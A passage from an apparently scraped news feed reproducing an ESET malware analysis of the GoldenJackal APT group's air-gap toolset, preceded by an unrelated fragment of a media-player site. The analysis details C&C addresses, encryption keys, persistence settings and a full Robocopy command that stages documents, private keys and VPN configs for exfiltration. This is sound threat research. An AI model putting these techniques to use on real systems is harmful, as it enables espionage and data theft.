<div id="readability-page-1" class="page"><div><p><h2>Find your Player</h2><h2>Video and audio player themes built with<!-- --> <!--$--><a target="_blank" href="https://media-chrome.org/">Media Chrome</a><!--/$-->, for <strong>every web player</strong> and <strong>every web app framework</strong>.</h2></p><div><div><div><p>1</p></div><p>Find a player theme you love</p></div><div><div><p>2</p></div><p>Pick your player and app framework</p></div><div><div><p>3</p></div><p>Copy, paste, and you're done</p></div><div><div><p>+</p></div><p>Customize any detail of the player UI using just HTML and CSS</p></div></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[European govt air-gapped systems breached using custom malware (177 pts)]]></title>
            <link>https://www.welivesecurity.com/en/eset-research/mind-air-gap-goldenjackal-gooses-government-guardrails/</link>
            <guid>41779952</guid>
            <pubDate>Tue, 08 Oct 2024 17:52:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.welivesecurity.com/en/eset-research/mind-air-gap-goldenjackal-gooses-government-guardrails/">https://www.welivesecurity.com/en/eset-research/mind-air-gap-goldenjackal-gooses-government-guardrails/</a>, See on <a href="https://news.ycombinator.com/item?id=41779952">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    <p>ESET researchers discovered a series of attacks on a governmental organization in Europe using tools capable of targeting air-gapped systems. The campaign, which we attribute to GoldenJackal, a cyberespionage APT group that targets government and diplomatic entities, took place from May 2022 to March 2024. By analyzing the toolset deployed by the group, we were able to identify an attack GoldenJackal carried out earlier, in 2019, against a South Asian embassy in Belarus that, yet again, targeted the embassy’s air-gapped systems with custom tools.</p>
<p>This blogpost introduces previously undocumented tools that we attribute to GoldenJackal based on victimology, code, and functional similarities between the toolsets.</p>
<blockquote>
<p><strong>Key points of the blogpost:</strong></p>
<ul>
<li>GoldenJackal used a custom toolset to target air-gapped systems at a South Asian embassy in Belarus since at least August 2019. In this blogpost, we describe these tools publicly for the first time.</li>
<li>This blogpost also features the first public description of a highly modular toolset GoldenJackal deployed in Europe on various occasions between May 2022 and March 2024 against a European Union government organization.</li>
<li>These toolsets provide GoldenJackal a wide set of capabilities for compromising and persisting in targeted networks. Victimized systems are abused to collect interesting information, process the information, exfiltrate files, and distribute files, configurations and commands to other systems.</li>
<li>The ultimate goal of GoldenJackal seems to be stealing confidential information, especially from high-profile machines that might not be connected to the internet.</li>
</ul>
</blockquote>
<h2>GoldenJackal profile</h2>
<p>GoldenJackal is an APT group active since at least 2019. It targets government and diplomatic entities in Europe, the Middle East, and South Asia. The group is little known and has only been publicly described in 2023 by <a href="https://securelist.com/goldenjackal-apt-group/109677/" target="_blank" rel="noopener">Kaspersky</a>. The group’s known toolset includes several implants written in C#: JackalControl, JackalSteal, JackalWorm, JackalPerInfo, and JackalScreenWatcher – all of them used for espionage.</p>
<h2>Overview</h2>
<p>In May 2022, we discovered a toolset that we could not attribute to any APT group. But once the attackers used a tool similar to one of those publicly documented by Kaspersky, we were able to dig deeper and to find a connection between the publicly documented toolset of GoldenJackal and this new one.</p>
<p>Extrapolating from that, we managed to identify an earlier attack where the publicly documented toolset was deployed, as well as an older toolset that also has capabilities to target air-gapped systems. This blogpost shines a light on the technical aspects of the publicly undocumented toolsets, and shares some insights about GoldenJackal’s tactics, techniques, and procedures.</p>
<h3>Victimology</h3>
<p>GoldenJackal has been targeting governmental entities in Europe, the Middle East, and South Asia. We detected GoldenJackal tools at a South Asian embassy in Belarus in August and September 2019, and again in July 2021.</p>
<p><a href="https://securelist.com/goldenjackal-apt-group/109677/#victims" target="_blank" rel="noopener">Kaspersky reported</a> a limited number of attacks against government and diplomatic entities in the Middle East and South Asia, starting in 2020.</p>
<p>More recently, according to ESET telemetry, a European Union governmental organization was repeatedly targeted from May 2022 until March 2024.</p>
<h3>Attribution</h3>
<p>All the campaigns that we describe in this blogpost deployed, at some point, at least one of the tools attributed to the GoldenJackal APT group <a href="https://securelist.com/goldenjackal-apt-group/109677/" target="_blank" rel="noopener">by Kaspersky</a>. As was the case in the Kaspersky report, we can’t attribute GoldenJackal’s activities to any specific nation-state. There is, however, one clue that might point towards the origin of the attacks: in the GoldenHowl malware, the C&amp;C protocol is referred to as <span>transport_http</span>, which is an expression typically used by Turla (see our <a href="https://web-assets.esetstatic.com/wls/2020/05/ESET_Turla_ComRAT.pdf" target="_blank" rel="noopener">ComRat v4 report</a>) and <a href="https://www.welivesecurity.com/en/eset-research/moustachedbouncer-espionage-against-foreign-diplomats-in-belarus/" target="_blank" rel="noopener">MoustachedBouncer</a>. This may indicate that the developers of GoldenHowl are Russian speakers.</p>
<h3><a name="_Toc178267626"></a>Breaching air-gapped systems</h3>
<p>In order to minimize the risk of compromise, highly sensitive networks are often air gapped, i.e., isolated from other networks. Usually, organizations will air gap their most valuable systems, such as voting systems and industrial control systems running power grids. These are often precisely the networks that are of most interest to attackers.</p>
<p>As we stated in a previous white paper titled <a href="https://web-assets.esetstatic.com/wls/2021/12/eset_jumping_the_air_gap_wp.pdf" target="_blank" rel="noopener">Jumping the air gap: 15 years of nation-state effort</a>, compromising an air-gapped network is much more resource-intensive than breaching an internet-connected system, which means that frameworks designed to attack air-gapped networks have so far been exclusively developed by APT groups. The purpose of such attacks is always espionage, perhaps with <a href="https://web-assets.esetstatic.com/wls/2012/11/Stuxnet_Under_the_Microscope.pdf" target="_blank" rel="noopener">a side of sabotage</a>.</p>
<p>With the level of sophistication required, it is quite unusual that in five years, GoldenJackal managed to build and deploy not one, but two separate toolsets designed to compromise air-gapped systems. This speaks to the resourcefulness of the group. The attacks against a South Asian embassy in Belarus made use of custom tools that we have only seen in that specific instance. The campaign used three main components: GoldenDealer to deliver executables to the air-gapped system via USB monitoring; GoldenHowl, a modular backdoor with various functionalities; and GoldenRobo, a file collector and exfiltrator.</p>
<p>In the latest series of attacks against a government organization in Europe, GoldenJackal moved on from the original toolset to a new, highly modular one. This modular approach applied not only to the design of the malicious tools (as was the case with GoldenHowl), but also to their roles: they were used, among other things, to collect and process interesting information, to distribute files, configurations, and commands to other systems, and to exfiltrate files.</p>
<h2>Technical analysis</h2>
<h3>Initial access</h3>
<p>So far, we haven’t been able to trace back to the initial compromise vector in the campaigns seen in our telemetry. Note that Kaspersky reported in a <a href="https://securelist.com/goldenjackal-apt-group/109677/" target="_blank" rel="noopener">blogpost</a> that GoldenJackal used trojanized software and malicious documents for this purpose.</p>
<h3>The mysterious toolset from 2019</h3>
<p>The earliest attack that we have attributed to GoldenJackal, which targeted a South Asian embassy in Belarus, occurred in August 2019. The toolset used in this attack is, to the best of our knowledge, publicly undocumented. We’ve only observed the following custom tools once, and never again:</p>
<ul>
<li>A malicious component that can deliver executables to air-gapped systems via USB drives. We’ve named this component GoldenDealer.</li>
<li>A backdoor, which we’ve named GoldenHowl, with various modules for malicious capabilities.</li>
<li>A malicious file collector and exfiltrator, which we’ve named GoldenRobo.</li>
</ul>
<p>An overview of the attack is shown in Figure 1. The initial attack vector is unknown, so we assume that GoldenDealer and an unknown worm component are already present on a compromised PC that has access to the internet. Whenever a USB drive is inserted, the unknown component copies itself and the GoldenDealer component to the drive. While we didn’t observe this unknown component, we have seen components with similar purposes – such as <a href="https://securelist.com/goldenjackal-apt-group/109677/#jackalworm" target="_blank" rel="noopener">JackalWorm</a> – in other toolsets used in later attacks performed by the group.</p>
<figure><img src="https://web-assets.esetstatic.com/wls/2024/10-2024/goldenjackal/figure-1.png" alt="" width="1327" height="2000">
<figcaption><em>Figure 1. Overview of the initial compromise of an air-gapped system</em></figcaption>
</figure>
<p>It is probable that this unknown component finds the last modified directory on the USB drive, hides it, and renames itself with the name of this directory, which is done by JackalWorm. We also believe that the component uses a folder icon, to entice the user to run it when the USB drive is inserted in an air-gapped system, which again is done by JackalWorm.</p>
<p>When the drive is again inserted into the internet-connected PC, GoldenDealer takes the information about the air-gapped PC from the USB drive and sends it to the C&amp;C server. The server replies with one or more executables to be run on the air-gapped PC. Finally, when the drive is again inserted into the air-gapped PC, GoldenDealer takes the executables from the drive and runs them. Note that this time no user interaction is needed, because GoldenDealer is already running.</p>
<p>We have observed GoldenDealer running GoldenHowl on an internet-connected PC. While we didn’t observe GoldenDealer directly executing GoldenRobo, we observed the latter also running on the connected PC, used to take files from the USB drive and exfiltrate them to its C&amp;C server. There must be yet another unknown component that copies files from the air-gapped PC to the USB drive, but we haven’t observed it yet.</p>
<h4>GoldenDealer</h4>
<p>This component monitors the insertion of removable drives on both air-gapped and connected PCs, as well as internet connectivity. Based on the latter, it can download executable files from a C&amp;C server and hide them on removable drives, or retrieve them from these drives and execute them on systems that have no connectivity.</p>
<p>The program can be run with or without arguments. When run with arguments, it takes a path to a file that it moves to a new location and then runs via the <span>CreateProcessW</span> API without creating a window.</p>
<p>To prevent hidden files being shown in Windows Explorer, GoldenDealer creates the <span>ShowSuperHidden</span> value in the <span>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced</span> registry key, and sets it to zero.</p>
<p>In case GoldenDealer is not running as a service, it creates and starts a service called <span>NetDnsActivatorSharing</span>, then exits. If for any reason the service couldn’t be created, persistence is achieved by creating an entry in a <span>Run</span> registry key.</p>
<p>Table 1 shows the list of configuration files used by GoldenDealer. These are located in the directory from which the malware is running: <span>C:\Windows\TAPI</span> in the observed attack. More details about these files is provided in subsequent sections.</p>
<blockquote>
<p>Table 1. Configuration files used by GoldenDealer</p>
</blockquote>
<table>
<thead>
<tr>
<td><strong>Filename</strong>&nbsp;</td>
<td><strong>Purpose</strong>&nbsp;</td>
</tr>
</thead>
<tbody>
<tr>
<td><span>b8b9-de4d-3b06-9d44</span>&nbsp;</td>
<td>Store status fields.&nbsp;</td>
</tr>
<tr>
<td><span>fb43-138c-2eb0-c651</span>&nbsp;</td>
<td>Store executable files sent by the C&amp;C server.&nbsp;</td>
</tr>
<tr>
<td><span>130d-1154-30ce-be1e</span>&nbsp;</td>
<td>Store information about all compromised PCs in the network.&nbsp;</td>
</tr>
<tr>
<td><span>38c4-abb9-74f5-c4e5</span>&nbsp;</td>
<td>Used as a mutex. If this file is open, it means that an instance of GoldenDealer is already running.&nbsp;</td>
</tr>
</tbody>
</table>
<p>The contents of configuration files are JSON formatted, and stored XOR encrypted on disk. XOR encryption is performed one byte at a time, with a single-byte key that is incremented based on a multiplier.</p>
<h5>Network connectivity thread</h5>
<p>In order to determine whether a PC is connected to the internet, GoldenDealer sends a GET request to <span>https://1.1.1.1/&lt;user_id&gt;</span> every 15 minutes. If the connection fails, or there’s no reply, the PC is assumed to be offline. <span>1.1.1.1</span> maps to Cloudflare’s DNS resolver, and the expected behavior is to receive a <span>Not Found</span> document and a <span>404</span> status code. The <span>&lt;user_id&gt;</span> part is not relevant here, but is used for C&amp;C communication. GoldenDealer generates this user identifier based on:</p>
<ul>
<li>The current username as found via the <span>GetUserNameW</span> API.</li>
<li>The serial number of the first available logical drive in the system. This does not necessarily mean the drive where the OS is installed.</li>
</ul>
<p>These two strings are separately hashed with the <a href="https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function" target="_blank" rel="noopener">FNV-1a</a> function, and the resulting numbers are XORed together, obtaining a number that identifies the user.</p>
<p>To keep track of network connectivity status, GoldenDealer uses a global variable that can hold any of the following values:</p>
<ul>
<li><span>0</span> – Malware started running and connectivity has not been checked.</li>
<li><span>1</span> – PC doesn’t have internet connectivity.</li>
<li><span>2</span> – PC has internet connectivity.</li>
</ul>
<p>If the status is <span>2</span>, a thread is signaled to download executable files from the C&amp;C server, and another thread is signaled to copy the executables to USB drives. A thread to get executables from drives and run them will only be signaled when the status is <span>1</span>. Whenever the status changes, the configuration file <span>b8b9-de4d-3b06-9d44</span> is updated with the new value. Fields in this file are:</p>
<ul>
<li><span>wmk</span> – network connectivity status.</li>
<li><span>qotwnk</span> – number of seconds without internet. This value is incremented every 15 minutes and reset to zero when there’s connectivity. It can be used if the malware is configured to wait a minimum number of seconds before deciding that the PC has no connectivity, but there was no wait in the samples that we observed.</li>
<li><span>ltwnk</span> – unknown. This field is not used by the malware.</li>
<li><span>rpk</span> – list with hashes of executables downloaded from the C&amp;C server.</li>
</ul>
<h5><a name="_User_identifier"></a>Downloader thread</h5>
<p>This thread checks the network connectivity status every 30 minutes, and only performs the following actions if the PC is connected to the internet. First, a GET request is sent to <span>https://83.24.9[.]124/&lt;user_id&gt;</span>, just to let the C&amp;C server know that another request is to follow. The reply from the server is not processed. If the request fails, then another request is sent to a secondary server, <span>http://196.29.32[.]210/&lt;user_id&gt;</span>, probably to notify about failure, as the thread doesn’t continue to execute in this case. The URLs are hardcoded in the malware and are not configurable in the samples that we observed.</p>
<p>When communication is successful, GoldenDealer sends a request to <span>https://83.24.9[.]124/&lt;user_id&gt;/fc93-10f4-2a68-d548</span>. The server replies with an array of JSON objects with the following fields:</p>
<ul>
<li><span>ek</span> – a base64-encoded string that is an executable file after being decoded,</li>
<li><span>tpik</span> – an array of <span>user_ids</span> used to decide whether the executable will be run,</li>
<li><span>hek</span> – the FNV-1a hash of <span>ek</span>, and</li>
<li><span>apk</span> – date and time when the executable was obtained from the C&amp;C server.</li>
</ul>
<p>The contents of the last two fields are not relevant, because they are calculated by the downloader thread, replacing original data sent by the C&amp;C server. In both cases, they are stored as decimal numbers.</p>
<p>GoldenDealer will run an executable sent by the server if the corresponding <span>user_id</span> is in the <span>tpik</span> list, and the <span>hek</span> hash is not in the list of hashes stored in the <span>rpk</span> field in the configuration. In other words, connected PCs can download executables and pass them along to other systems via USB drives, but they can also run received executables. When an executable is run, its hash is added to the <span>rpk</span> list, ensuring that it will only be executed once by that victim. Each executable is written in the working directory with the value of <span>&lt;hek&gt;</span> as its filename. All JSON objects with received executables are stored on disk, in the file <span>fb43-138c-2eb0-c651</span>.</p>
<p>As the final step, the downloader thread collects information about the compromised system and sends it to <span>https://83.24.9[.]124/&lt;user_id&gt;/a1e7-4228-df20-1600</span>. The configuration file <span>130d-1154-30ce-be1e</span> is updated to store this information as well. Figure 2 shows part of the JSON object with the information sent to the C&amp;C server. While all strings are sent as arrays of decimal character codes, for readability we show them as strings in the image. For example, instead of <span>lsass.exe</span>, the value <span>[108, 115, 97, 115, 115, 46, 101, 120, 101]</span> is actually sent.</p>
<figure><img src="https://web-assets.esetstatic.com/wls/2024/10-2024/goldenjackal/figure-2.png" alt="" width="934" height="909">
<figcaption><em>Figure 2. Part of the information sent by the downloader thread to the C&amp;C server</em></figcaption>
</figure>
<p>The members are:</p>
<ul>
<li><span>iepk</span> – a Boolean value that indicates whether the GoldenDealer process is elevated,</li>
<li><span>pclk</span> – an array of running processes,</li>
<li><span>pglk</span> – an array of installed programs in both <span>Program Files</span> and <span>Program Files (x86)</span> directories,</li>
<li><span>pik</span> – the <span>user_id</span>,</li>
<li><span>sik</span> – information about the operating system (including version, build, service pack number; architecture; and Boolean values indicating whether the OS is running on a server, domain controller, or workstation),</li>
<li><span>uck</span> – the user who is running the GoldenDealer process, and</li>
<li><span>ulk</span> – an array of all users, each with a Boolean value indicating whether the user has administrator privileges.</li>
</ul>
<h5>USB monitoring thread on connected PCs</h5>
<p>GoldenDealer monitors the insertion of removable drives by creating a window titled <span>defaultWindow</span> with a custom event handler that processes inserted devices and ignores all other system events.</p>
<p>Once a USB drive has been inserted, this thread patches one byte in the master boot record (MBR) of that drive: it searches for the offset where the <span>BOOTMGR</span> string resides, and replaces the first <span>O</span> with <span>0</span>. Then it checks whether the second <span>O</span> has also been patched to <span>0</span>, and exits if it hasn’t. The USB thread that runs on air-gapped PCs does the opposite: it patches the second <span>O</span>, and checks whether the first has already been patched. This means that the USB drive needs to have been inserted in both a connected PC and an air-gapped PC for the drive to be processed.</p>
<p>If the check is successful, a hidden directory is created on the USB drive, with two files written inside:</p>
<ul>
<li><span>37b3-ebe5-568e-0676</span> – this file has the same contents as <span>fb43-138c-2eb0-c651</span> (all the executables sent by the C&amp;C server). It’s used to pass the executables to air-gapped systems, for execution.</li>
<li><span>bc41-ac6f-e55e-61a8</span> – a file with information from air-gapped PCs. It’s created empty by this thread, then populated by the USB thread running on air-gapped PCs. The contents of this file are appended to the local file <span>130d-1154-30ce-be1e</span> (see Table 1), to be sent to the C&amp;C server by the downloader thread.</li>
</ul>
<h5>USB monitoring thread on air-gapped PCs</h5>
<p>This is complementary to the thread described in the previous section: it takes the file <span>37b3-ebe5-568e-0676</span> with executables on the USB drive and copies its contents to the local file <span>fb43-138c-2eb0-c651</span>. It also takes the local file <span>130d-1154-30ce-be1e</span> with information about the air-gapped system and adds its contents to the <span>bc41-ac6f-e55e-61a8</span> file on the USB drive. The code to obtain system information and to run executables is contained in this thread.</p>
<h4>GoldenHowl</h4>
<p>Another tool from GoldenJackal’s 2019 toolset is GoldenHowl, a backdoor written in Python that consists of various modules for malicious functionalities. It is distributed as a self-extracting archive that contains legitimate Python binaries and libraries, as well as malicious scripts. Figure 3 shows the contents of one of these archives. The attackers renamed the Python executable – in version 2.7.15 – as <span>WinAeroModule.exe</span>. This component is intended to be run on PCs with internet connectivity, given its functionalities.</p>
<figure><img src="https://web-assets.esetstatic.com/wls/2024/10-2024/goldenjackal/figure-3.png" alt="" width="1081" height="1155">
<figcaption><em>Figure 3. Contents of GoldenHowl’s self-extracting archive</em></figcaption>
</figure>
<p>The initial script in GoldenHowl, referred to as <span>core_script</span> in the malware’s configuration file, performs the following actions:</p>
<ul>
<li>decrypts and loads the malware’s configuration from a JSON file,</li>
<li>creates directories used by the malware, and</li>
<li>starts a thread for each module.</li>
</ul>
<p>The malware’s configuration is decrypted using the <a href="https://cryptography.io/en/latest/fernet/" target="_blank" rel="noopener">Fernet</a> algorithm, with the hardcoded key <span>_ylmUTbqcx6FxMZ5ZvNxDQZYuNh41yxhKcPJLzxgqEY=</span>. Figure 4 shows part of the decrypted configuration.</p>
<figure><img src="https://web-assets.esetstatic.com/wls/2024/10-2024/goldenjackal/figure-4.png" alt="" width="948" height="940">
<figcaption><em>Figure 4. Part of GoldenHowl’s decrypted configuration</em></figcaption>
</figure>
<p>Table 2 shows the Python modules that we’ve observed – in the order that they appear in the config – along with a description of their functionalities. All modules run indefinitely, except for the <span>persistence_schtasks</span> module, which runs only once.</p>
<blockquote>
<p>Table 2. Malicious modules in GoldenHowl</p>
</blockquote>
<table>
<thead>
<tr>
<td><strong>Module name</strong>&nbsp;</td>
<td><strong>File on disk</strong>&nbsp;</td>
<td><strong>Description</strong>&nbsp;</td>
</tr>
</thead>
<tbody>
<tr>
<td><span>persistence_schtasks</span>&nbsp;</td>
<td><span>5991-8d44-b226⁠-⁠0e6c.py</span>&nbsp;</td>
<td>Creates the scheduled task <span>Microsoft\Windows\Multimedia\SystemSoundsService2</span> to persist the execution of core_script.&nbsp;</td>
</tr>
<tr>
<td><span>files_tree</span>&nbsp;</td>
<td><span>edc5-4055-37cd-d2d2.py</span>&nbsp;</td>
<td>Generates a listing of files and directories by calling Windows’ tree command, for a path specified in a request sent by the C&amp;C.&nbsp;</td>
</tr>
<tr>
<td><span>files_stealer</span>&nbsp;</td>
<td><span>5488-240b-c00f-203a.py</span>&nbsp;</td>
<td>Exfiltrates a single file to the C&amp;C server. The file path is specified in a request sent by the C&amp;C.&nbsp;</td>
</tr>
<tr>
<td><span>data_transform</span>&nbsp;</td>
<td><span>8744-a287-35be-4ea0.py</span>&nbsp;</td>
<td>Utility module that takes incoming requests from the C&amp;C server and decrypts them, and takes responses from other modules that need to be sent to the C&amp;C and encrypts them. The encryption algorithm is Fernet, and the key is specific to this module: <span>QRqXhd_iB_Y3LpT2wTVK6Dao5uOq2m5KMiVkMnJfgw4=</span>&nbsp;</td>
</tr>
<tr>
<td><span>transport_http</span>&nbsp;</td>
<td><span>63d5-be5f-e4df-7e65.py</span>&nbsp;</td>
<td>Utility module that uploads and downloads files from the C&amp;C server. See the <em><a href="#C&amp;C communication">C&amp;C communication</a></em> section for more information. Note that the word transport is commonly used by <a href="https://web-assets.esetstatic.com/wls/2020/05/ESET_Turla_ComRAT.pdf">Turla </a>and <a href="https://www.welivesecurity.com/en/eset-research/moustachedbouncer-espionage-against-foreign-diplomats-in-belarus/">MoustachedBouncer</a> to refer to a type of C&amp;C protocol. Although this might be shared across Russian-speaking developers, this is a low confidence element for attribution.&nbsp;</td>
</tr>
<tr>
<td><span>updater</span>&nbsp;</td>
<td><span>c7b4-0999-aec4-a0c8.py</span>&nbsp;</td>
<td>Utility module that receives a ZIP archive with updated modules or configuration from the C&amp;C server, extracts the archive, and runs <span>core_script</span> in a new process, terminating the current process.&nbsp;</td>
</tr>
<tr>
<td><span>sshcmd</span>&nbsp;</td>
<td><span>1ee0-7c3a-3331-4df3.py</span>&nbsp;</td>
<td>Connects to an SSH server specified in a request sent by the C&amp;C. Acts as a reverse shell, executing commands received from the C&amp;C.&nbsp;</td>
</tr>
<tr>
<td><span>ipscanner</span>&nbsp;</td>
<td><span>a86b-108c-36c7-6972.py</span>&nbsp;</td>
<td>Generates a listing with active IP addresses in an IP range, based on an IP mask specified in a request sent by the C&amp;C server. To do so, it first sends a message to all IP addresses in the range, on port <span>59173</span>, and then it runs the command <span>arp -a</span> to obtain the ARP cache tables for all interfaces.&nbsp;</td>
</tr>
<tr>
<td><span>portscanner</span>&nbsp;</td>
<td><span>2648-69f9-6dc0-3476.py</span>&nbsp;</td>
<td>Generates a listing with ports that are accepting connections, based on an IP address and a list of ports specified in a request sent by the C&amp;C server.&nbsp;</td>
</tr>
<tr>
<td><span>sshtunnel</span>&nbsp;</td>
<td><span>9ea4-fb87-6d57-924a.py</span>&nbsp;</td>
<td>Creates an SSH tunnel with an SSH server, to forward messages going from (and to) a host on a listening port, to a forwarding port on the SSH server. A request from the C&amp;C server specifies: the address and port of the SSH server, username and password for the SSH session, the forwarding port on the SSH server, and the address and port of the listening host.&nbsp;</td>
</tr>
<tr>
<td><span>eternalbluechecker</span>&nbsp;</td>
<td><span>4b19-7f72-8c17-dceb.py</span>&nbsp;</td>
<td>Checks whether a host, specified in a request sent by the C&amp;C server, is vulnerable to a Windows SMB remote code execution vulnerability. The code for this module is the same as in <span>mysmb.py</span> and <span>checker.py</span> from <a href="https://github.com/worawit/MS17-010/" target="_blank" rel="noopener">this public repository</a>. There is no code in this module to exploit vulnerable hosts.&nbsp;</td>
</tr>
<tr>
<td><span>socks_proxy</span>&nbsp;</td>
<td><span>8b55-3ac9-5c30-d0c4.py</span>&nbsp;</td>
<td>Acts as a proxy server, forwarding packets from a source address to a destination address. The port to listen for incoming connections is specified in a request sent by the C&amp;C server. The code in this module is very similar to that of <a href="https://github.com/MisterDaneel/pysoxy/" target="_blank" rel="noopener">pysoxy</a>.&nbsp;</td>
</tr>
<tr>
<td><span>text_writer</span>&nbsp;</td>
<td><span>0ffc-667e-dce4-b270.py</span>&nbsp;</td>
<td>Writes a text file to a given path. The path and text for writing are specified in a request sent by the C&amp;C server.&nbsp;</td>
</tr>
</tbody>
</table>
<h4>C&amp;C communication<a id="C&amp;C communication"></a></h4>
<p>According to GoldenHowl’s configuration, anything that comes from the C&amp;C server is called a request, and files going to the C&amp;C server represent a response. It should be noted that despite this naming convention, GoldenHowl is not a passive implant: it initiates the connections to the C&amp;C server. The <span>transport_http</span> module is responsible for communication with the C&amp;C server, and for writing requests and responses to specific directories. Table 3 shows directories used by GoldenHowl.</p>
<blockquote>
<p>Table 3. Directories in GoldenHowl’s configuration</p>
</blockquote>
<table>
<thead>
<tr>
<td><strong>Name&nbsp;in&nbsp;configuration</strong>&nbsp;</td>
<td><strong>Name on disk</strong>&nbsp;</td>
<td><strong>Description</strong>&nbsp;</td>
</tr>
</thead>
<tbody>
<tr>
<td><span><span>download_dir</span></span>&nbsp;</td>
<td><span><span>a700‑280c‑f067‑5a06</span></span>&nbsp;</td>
<td>Stores encrypted requests coming from the C&amp;C server.&nbsp;</td>
</tr>
<tr>
<td><span><span>upload_dir</span></span>&nbsp;</td>
<td><span><span>b307‑05ea‑7ac8‑c369</span></span>&nbsp;</td>
<td>Stores encrypted responses, with files or output of commands, to be sent to the C&amp;C server.&nbsp;</td>
</tr>
<tr>
<td><span><span>data_dir</span></span>&nbsp;</td>
<td><span><span>cda2‑b818‑3403‑b564</span></span>&nbsp;</td>
<td>Stores requests sent by the C&amp;C server, which are taken from <span><span>download_dir</span></span>, decrypted, and placed in this directory for modules to process. Also stores output of executed commands (responses), which are taken from this directory, encrypted, and written to <span><span>upload_dir</span></span>. These actions are performed by the <span><span>data_transform</span></span> module.&nbsp;</td>
</tr>
<tr>
<td><span><span>temp_dir</span></span>&nbsp;</td>
<td><span><span>5bc5‑0788‑d469‑2f3a</span></span>&nbsp;</td>
<td>This directory was not used in any observed modules.&nbsp;</td>
</tr>
</tbody>
</table>
<p>Requests and responses have structured filenames:</p>
<ul>
<li>Request – <span>&lt;client_id&gt;&lt;module_id&gt;&lt;request_id&gt;&lt;request_suffix&gt;</span></li>
<li>Response – <span>&lt;client_id&gt;&lt;module_id&gt;&lt;request_id&gt;&lt;response_suffix&gt;</span></li>
</ul>
<p>The fields <span>client_id</span>, <span>request_suffix</span>, and <span>response_suffix</span> are specified in the configuration and are common to all modules (see Figure 4 for examples). The field <span>module_id</span> indicates which module needs to process a request or generate a response, and is defined in the configuration section of each individual module. The field request_id is generated on the C&amp;C server, and ties together requests with responses.</p>
<p>The <span>transport_http</span> module sends GET requests periodically to the C&amp;C server to check for available requests. The configuration fields specific to this module are:</p>
<ul>
<li><span>server_address</span> – address of the C&amp;C server (we observed <span>83.24.9[.]124</span>, the same address as GoldenDealer’s server),</li>
<li><span>server_port</span> – the port used to communicate with the server (we observed 443),</li>
<li><span>server_use_ssl</span> – indicates whether HTTP or HTTPS will be used for communication,</li>
<li><span>base_timeout_sec</span> – the minimum wait time before contacting the C&amp;C server, and</li>
<li><span>timeout_filename</span> – the filename of a text file with a number between 0 and 3600, to specify a different number of seconds to wait between communications. This file is not included with GoldenHowl, but it could be placed by the attackers with the <span>text_writer</span> module.</li>
</ul>
<p>The address used to contact the C&amp;C server is <span>https://&lt;server_address&gt;:&lt;server_port&gt;/&lt;client_id&gt;/</span>.</p>
<h4>GoldenRobo</h4>
<p>The last of the observed tools from the 2019 toolset, GoldenRobo, is a simple component written in Go that executes the <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy" target="_blank" rel="noopener">Robocopy</a> utility to stage files and send them to its C&amp;C server. It iterates across all drive letters from A to Z, trying to access each drive. If successful, a Robocopy command is constructed:</p>
<p><span>robocopy &lt;drive_letter&gt;:\ &lt;malware_folder&gt;\1516-fe89-ad12-8102\&lt;drive_letter&gt;\ *.doc *.docx *.xls *.xlsx *.ppt *.pptx *.pdf *.rtf *.tif *.jpg *.jpeg *.crt *.key *.p12 *.ovpn *.zip *.rar "" /S /R:0 /MAXAGE:7 /XD &lt;malware_folder&gt;\1516-fe89-ad12-8102\\ 1516-fe89-ad12-8102\\ "Application Data" "All Users" "Documents and Settings" "Local Settings"</span></p>
<p>If we break down the command:</p>
<ul>
<li>files are copied from <span>drive_letter</span>,</li>
<li>to <span>&lt;malware_folder&gt;\1516-fe89-ad12-8102\&lt;drive_letter&gt;\</span> (for example: <span>C:\Windows\TAPI\1516-fe89-ad12-8102\C\</span>),</li>
<li>only if the files have extensions <span>.doc</span>, <span>.docx</span>, <span>.xls</span>, <span>.xlsx</span>, <span>.ppt</span>, <span>.pptx</span>, <span>.pdf</span>, <span>.rtf</span>, <span>.tif</span>, <span>.jpg</span>, <span>.jpeg</span>, <span>.crt</span>, <span>.key</span>, <span>.p12</span>, <span>.ovpn</span>, <span>.zip</span>, or<span> .rar</span>,</li>
<li>including subdirectories (<span>/S</span>),</li>
<li>not retrying on failed copies (<span>/R:0</span>),</li>
<li>excluding files older than seven days (<span>/MAXAGE:7</span>), and</li>
<li>excluding specified directories (<span>/XD</span>).</li>
</ul>
<p>Copied files from all drives are archived together in a ZIP file <span>_1423-da77-fe86&lt;month&gt;-&lt;day&gt;</span> in the same directory where GoldenRobo is running (with <span>&lt;month&gt;</span> and <span>&lt;day&gt;</span> corresponding to the current date).</p>
<p>The archive is sent base64 encoded to <span>https://83.24.9[.]124/8102/</span>. The last part of the URL is <span>8102</span>, which is the same as the <span>client_id</span> field in GoldenHowl’s configuration. This URL is hardcoded in GoldenRobo, which tells us that the attackers compiled this version of GoldenRobo for this victim exclusively.</p>
<h3>The known toolset: Previously documented by Kaspersky</h3>
<p>A few weeks after deploying the previous toolset, GoldenJackal started to use other malicious tools on the same compromised computers. In September 2019, we observed the execution of PowerShell scripts to download the <a href="https://securelist.com/goldenjackal-apt-group/109677/#jackalcontrol" target="_blank" rel="noopener">JackalControl</a> backdoor. This backdoor was used to execute other PowerShell scripts, to download and run legitimate tools such as <a href="https://the.earth.li/~sgtatham/putty/0.58/htmldoc/Chapter7.html" target="_blank" rel="noopener">Plink</a> and <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank" rel="noopener">PsExec</a>.</p>
<p>In various attacks, between September 2019 and January 2024, we observed the following tools in GoldenJackal’s arsenal:</p>
<ul>
<li>JackalControl,</li>
<li>JackalSteal, a file collector and exfiltrator, and</li>
<li>JackalWorm, used to propagate other malicious components via USB drives. We observed it propagating the JackalControl backdoor.</li>
</ul>
<p>As these components have already been documented by <a href="https://securelist.com/goldenjackal-apt-group/109677/">Kaspersky</a>, we will not describe them in this blogpost. However, one interesting point to mention is that in early versions of these tools, URLs for C&amp;C servers were hardcoded in the malware binaries. At some point, GoldenJackal modified JackalControl and JackalSteal to receive C&amp;C servers as arguments.</p>
<h3>The latest toolset: Keeping a foothold in the network</h3>
